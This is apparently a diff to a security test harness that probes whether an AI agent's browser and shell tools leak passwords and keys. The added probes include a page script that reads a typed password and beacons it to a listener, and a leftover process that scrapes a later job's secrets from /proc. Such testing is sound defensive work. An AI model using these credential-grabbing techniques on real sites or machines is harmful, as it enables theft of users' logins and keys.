@@ -8,9 +8,12 @@ routes, BR-* the four bridge operations. "Leaves the computer" probes send only
 to the listener the harness runs on the container bridge address."""
 import base64
 import hashlib
+import hmac
+import html
 import json
 import re
 import time
+import urllib.parse
 
 import canaries as K
 
@@ -161,7 +164,7 @@ def a3s(ctx):
     import pixels
     ctx.page()
     page = ('<html><body style="margin:0;background:#ff00ff;min-height:100vh">'
-            '<form action="/a3-done" method=get><input name=u type=text><input name=p type=password>'
+            '<form action="/a3-done" method=post><input name=u type=text><input name=p type=password>'
             '<button>sign in</button></form></body></html>')
     ctx.c.tool("files", action="put", path="site/a3-signin.html", content=page)
     ctx.c.tool("browser", action="navigate", url="http://localhost:8000/a3-signin.html")
@@ -715,6 +718,230 @@ def n6b(ctx):
     return res.strip('"').startswith("OK"), "navigator.credentials.get in the general browser: " + res.strip('"')[:70]
 
 
+
+# --- review of rc.2: findings 1-4 ---------------------------------------------------
+
+def spelled_in(text, value):
+    """Whether `text` carries `value` in any spelling a page, a URL or a form
+    gives it: plain, percent- or form-encoded, HTML entities, base64."""
+    seen = [text, urllib.parse.unquote(text), urllib.parse.unquote_plus(text), html.unescape(text),
+            html.unescape(urllib.parse.unquote_plus(text)), urllib.parse.unquote_plus(html.unescape(text))]
+    seen += decode_b64_lines(text)
+    return any(value in t for t in seen)
+
+
+def site_page(ctx, path, body, color="#ffff00"):
+    ctx.c.tool("files", action="put", path="site/" + path,
+               content=(f'<!doctype html><html><head><meta charset=utf-8></head><body style="margin:0;background:{color};'
+                        f'min-height:100vh;font:20px monospace">{body}</body></html>'))
+
+
+def refs_of(text):
+    return {kind: ref for ref, kind in re.findall(r"\[(e\d+)\] \[(text|password|button|textbox)\]", text)}
+
+
+def shot(ctx):
+    blocks, _ = ctx.c.call("browser", action="screenshot")
+    return ctx.c.image(blocks)
+
+
+def f1a(ctx):
+    """Finding 1 as the reviewer found it: a login's password typed into the
+    plain text field of a GET form on its own site, the form sent, the
+    address read back from `tabs`, then Back and a screenshot of the
+    restored field (against the same page before anything was typed)."""
+    import pixels
+    ctx.page()
+    site_page(ctx, "f1.html", '<form action="/f1-done" method=get>'
+              '<input name=q type=text style="caret-color:transparent;width:700px;font:20px monospace">'
+              '<button>go</button></form>')
+    site_page(ctx, "f1-done", "<h1>searched</h1>")
+    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f1.html")
+    refs = refs_of(ctx.c.tool("browser", action="text")[0])
+    if "text" not in refs:
+        return "broken", "the page has no text field"
+    empty = shot(ctx)
+    said, refused = ctx.c.tool("browser", action="fill", ref=refs["text"], secret="LOCALENC.password")
+    ctx.c.tool("browser", action="click_ref", ref=refs["button"])
+    time.sleep(1.5)
+    tabs, _ = ctx.c.tool("browser", action="tabs")
+    ctx.c.tool("browser", action="back")
+    time.sleep(1.5)
+    back = shot(ctx)
+    text, _ = ctx.c.tool("browser", action="text")
+    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
+    hits = []
+    if spelled_in(tabs, K.LOCAL_ENC):
+        hits.append("tabs shows the password in the address")
+    if spelled_in(text, K.LOCAL_ENC):
+        hits.append("text shows it")
+    if back and empty and pixels.decode(back) != pixels.decode(empty):
+        hits.append("the screenshot after Back shows the restored field")
+    return bool(hits), ("; ".join(hits) if hits else
+                        "fill: " + said.replace("\n", " ")[:110] + ("" if refused else " (typed)") +
+                        "; tabs, text and the screenshot after Back show nothing of it")
+
+
+def f1b(ctx):
+    """Finding 1, history: a password typed into a proper sign-in form,
+    sent, then Back. If the page comes back with the field still holding the
+    password, the tab must be hidden again. The page reports (to the host
+    listener) only how long the field's value is at each pageshow."""
+    ctx.page()
+    beacon = f"http://{ctx.host}:{ctx.port}/f1b"
+    site_page(ctx, "f1b.html", '<form action="/done" method=post><input name=u type=text>'
+              '<input name=p type=password><button>sign in</button></form>'
+              f"<script>addEventListener('pageshow',e=>{{new Image().src='{beacon}?len='+"
+              "document.querySelector('input[type=password]').value.length+'&persisted='+e.persisted+'&t='+Date.now()}})</script>",
+              color="#00ff00")
+    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/f1b.html")
+    refs = refs_of(ctx.c.tool("browser", action="text")[0])
+    if "password" not in refs:
+        return "broken", "no password field"
+    said, refused = ctx.c.tool("browser", action="fill", ref=refs["password"], secret="LOCALAPP.password")
+    if refused:
+        return "broken", "the password was not typed into a proper sign-in form: " + said[:80]
+    ctx.c.tool("browser", action="click_ref", ref=refs["button"])
+    time.sleep(1.5)
+    ctx.L.rows[:] = [r for r in ctx.L.rows if not r[0].startswith("/f1b")]
+    ctx.c.tool("browser", action="back")
+    time.sleep(2)
+    image = shot(ctx)
+    text, _ = ctx.c.tool("browser", action="text")
+    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
+    lens = [int(m.group(1)) for path, _ in list(ctx.L.rows) for m in [re.search(r"len=(\d+)", path)] if path.startswith("/f1b") and m]
+    restored = any(n > 0 for n in lens)
+    shown = bool(image) or "[password]" in text
+    if not restored:
+        return False, f"Back did not bring the typed value back (pageshow lengths {lens}); nothing to hide"
+    return shown, ("Back restored the typed password and the tab was shown again (screenshot "
+                   + ("an image" if image else "withheld") + ")" if shown else
+                   "Back restored the typed password and the tab stayed hidden")
+
+
+def f1c(ctx):
+    """Finding 1, redaction backstop: a sign-in page whose server answers
+    with the password it was sent in percent, form, base64 and HTML-entity
+    spellings, and one that sends it on in the next page's address. Neither
+    `text` nor `tabs` may carry any spelling of it."""
+    ctx.page()
+    site_page(ctx, "f1c.html", '<form action="/echo" method=post><input name=u type=text>'
+              '<input name=p type=password><button>sign in</button></form>', color="#0000ff")
+    site_page(ctx, "f1r.html", '<form action="/redirect" method=post><input name=u type=text>'
+              '<input name=p type=password><button>sign in</button></form>', color="#0000ff")
+    site_page(ctx, "shown", "<h1>shown</h1>")
+    hits, typed = [], []
+    for page in ("f1c.html", "f1r.html"):
+        ctx.c.tool("browser", action="navigate", url="http://localhost:8000/" + page)
+        refs = refs_of(ctx.c.tool("browser", action="text")[0])
+        said, refused = ctx.c.tool("browser", action="fill", ref=refs.get("password", "e0"), secret="LOCALENC.password")
+        typed.append(not refused)
+        ctx.c.tool("browser", action="click_ref", ref=refs.get("button", "e0"))
+        time.sleep(1.5)
+        text, _ = ctx.c.tool("browser", action="text")
+        tabs, _ = ctx.c.tool("browser", action="tabs")
+        if spelled_in(text, K.LOCAL_ENC):
+            hits.append(f"{page}: text carries a spelling")
+        if spelled_in(tabs, K.LOCAL_ENC):
+            hits.append(f"{page}: tabs carries a spelling")
+    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
+    if not all(typed):
+        return "broken", "the password was not typed into the sign-in forms"
+    return bool(hits), "; ".join(hits) or "neither the echo page nor the address carried any spelling of it"
+
+
+def f2(ctx):
+    """Finding 2: a process left behind by one job (a new session, so the
+    job's group kill misses it) reads a later job's stand-in and proxy
+    settings from /proc and uses them through the proxy while that job runs."""
+    if not ctx.bound:
+        return None, "needs a protected key (--delivery protected)"
+    url = f"https://{ctx.host}:{ctx.bound.port}/j8"
+    ctx.c.sh("rm -f ~/probe/j8.out")
+    ctx.c.sh(f"python3 ~/{JOB} leftover {url} 25")
+    time.sleep(1)
+    ctx.c.tool("shell", action="start", command="exec env J8B=1 sleep 20", wait_ms=500)
+    said = ""
+    for _ in range(40):
+        said = ctx.c.sh("cat ~/probe/j8.out 2>/dev/null")[0].strip()
+        if said:
+            break
+        time.sleep(0.5)
+    used = ctx.bound.heard("/j8", only=[K.GH])
+    return used, ("the bound service received the real key from the leftover process" if used else
+                  "the bound service never received the key from it") + f" ({said or 'no answer'})"
+
+
+def claim(c):
+    """The desk's side of the attest (rc.3 on): the boot's key, taken once."""
+    status, _, body = c.http("POST", "/capabilities/key")
+    try:
+        return status, json.loads(body)
+    except Exception:
+        return status, {}
+
+
+def f3(ctx):
+    """Finding 3: the capabilities attest. LEAKED when a holder of the bearer
+    alone (which a job could read while the computer ran legacy) can make a
+    proof the desk accepts: the bearer-keyed v1 form, a second claim of the
+    boot's key, or a key a job can read. Also: the proof must cover the mode."""
+    nonce = "f3-" + str(time.time())
+    _, _, body = ctx.c.http("GET", "/capabilities?nonce=" + urllib.parse.quote(nonce))
+    caps = json.loads(body)
+    boot, attest, prot = caps.get("boot", ""), caps.get("attest") or "", caps.get("protected", {})
+    v1 = base64.b64encode(hmac.new(ctx.token.encode(), f"hotline-broker-v1|{boot}|{nonce}".encode(),
+                                   hashlib.sha256).digest()).decode()
+    hits = []
+    if prot.get("v") == 1 and attest == v1:
+        hits.append("protected v1, attested with the bearer: whoever read the bearer can prove it")
+    key = getattr(ctx, "attest_key", None)
+    again, _ = claim(ctx.c)
+    if again == 200:
+        hits.append("the boot's key was handed out a second time")
+    if key:
+        mac = lambda mode: base64.b64encode(hmac.new(base64.b64decode(key), "|".join(
+            ["hotline-broker-v2", boot, mode, caps.get("version", ""), nonce]).encode(), hashlib.sha256).digest()).decode()
+        if attest != mac(prot.get("mode", "")):
+            hits.append("the v2 attest does not verify")
+        if attest == mac("legacy" if prot.get("mode") == "split" else "split"):
+            hits.append("the attest does not cover the mode")
+        out = job(ctx, "scan", key[::-1])
+        m = re.search(r"SCAN logs=(\d+) environ=(\d+)", out)
+        if not m or int(m.group(1)) + int(m.group(2)):
+            hits.append("a job finds the key: " + out.strip()[:60])
+    elif prot.get("v") != 1:
+        hits.append("no key was claimed at start")
+    return bool(hits), "; ".join(hits) or (f"protected v{prot.get('v')} {prot.get('mode')}: the attest verifies under the "
+                                           "boot's key alone, covers the mode, a second claim is refused, no job reads the key")
+
+
+def f4(ctx):
+    """Finding 4: a login on a loopback site that was not granted readable.
+    A job serves that site itself; its page's script reads what is typed and
+    sends it to the host listener."""
+    if ctx.delivery == "v1":
+        return None, "v1 delivery: no login is protected; LOOPAPP comes with v2"
+    beacon = f"http://{ctx.host}:{ctx.port}/f4"
+    ctx.serve(8002)
+    site_page(ctx, "f4.html", '<form action="/done" method=post><input name=u type=text>'
+              '<input name=p type=password autocomplete=current-password><button>sign in</button></form>'
+              "<script>const f=document.querySelector('input[type=password]');"
+              f"setInterval(()=>{{if(f.value)new Image().src='{beacon}?v='+encodeURIComponent(f.value)}},200)</script>")
+    ctx.c.tool("browser", action="navigate", url="http://localhost:8002/f4.html")
+    refs = refs_of(ctx.c.tool("browser", action="text")[0])
+    said, refused = ctx.c.tool("browser", action="fill", ref=refs.get("password", "e0"), secret="LOOPAPP.password")
+    time.sleep(2)
+    ctx.c.tool("browser", action="navigate", url="http://localhost:8000/")
+    got = any(K.LOOP_PASSWORD in urllib.parse.unquote(path) for path, _ in list(ctx.L.rows) if path.startswith("/f4"))
+    _, _, body = ctx.c.http("GET", "/capabilities?nonce=f4")
+    caps = json.loads(body).get("protected", {})
+    info, _ = ctx.c.tool("state", action="info")
+    labelled = "loopbackLogins" in caps
+    return got or not labelled, (("the job's page read LOOPAPP's password" if got else "fill: " + said.replace("\n", " ")[:100])
+                 + f"; /capabilities protected={caps}" + ("" if labelled else " (no loopback label)"))
+
+
 PROBES = [
     ("A1", "variable read back in another spelling by a shell job", a1),
     ("A2", "files get of a file holding the value in base64", a2),
@@ -761,4 +988,10 @@ PROBES = [
     ("N2", "snapshot still holds a share after the person revokes it", n2),
     ("N3", "upgrade from a 0.12 home leaves no readable cookie or login file", n3),
     ("N6b", "general browser finds a passkey for an attacker challenge", n6b),
+    ("F1a", "a login's password typed into a GET form's text field, read back from tabs, Back or screenshot", f1a),
+    ("F1b", "Back restores a typed password field and the tab is shown again", f1b),
+    ("F1c", "a page or address carries the password percent-, form-, base64- or entity-encoded", f1c),
+    ("F2", "a process left by one job uses a later job's stand-in through the proxy", f2),
+    ("F3", "the capabilities attest can be made by a bearer holder, replayed or read by a job", f3),
+    ("F4", "a loopback login not granted readable is typed into a page a job serves", f4),
 ]
